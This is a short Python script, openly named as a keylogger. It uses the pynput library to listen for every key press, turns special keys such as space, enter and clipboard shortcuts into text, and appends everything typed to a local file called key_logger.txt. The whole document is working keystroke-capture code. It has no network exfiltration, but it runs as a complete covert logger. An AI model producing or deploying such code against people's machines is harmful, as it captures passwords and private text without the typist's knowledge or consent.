from pynput.keyboard import Listener

def keylogger(key):
    key = str(key).replace("'","")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.up':
        key = ''
    if key == 'Key.right':
        key = ' '
    if key == 'Key.left':
        key = ''
    if key == 'Key.down':
        key = '\n'
    if key == 'Key.ctrl_l':
        key = 'ctrl'
    if key == '\\x03':
        key = 'copy'
    if key == 'Key.backspace':
        key = ''
    if key == 'Key.\\x18':
        key = 'cut'
    if key == 'Key.\\x16':
        key = 'paste '
    if key == 'Key.caps_lock':
        key = ' caps_lock'


    if not key.isalpha() or key.isnumeric():
        key = ' {0} '.format(key)

    with open('key_logger.txt',mode='a', encoding='utf-8') as file:
        file.write(key)

with Listener(on_press=keylogger) as listener:
    listener.join()


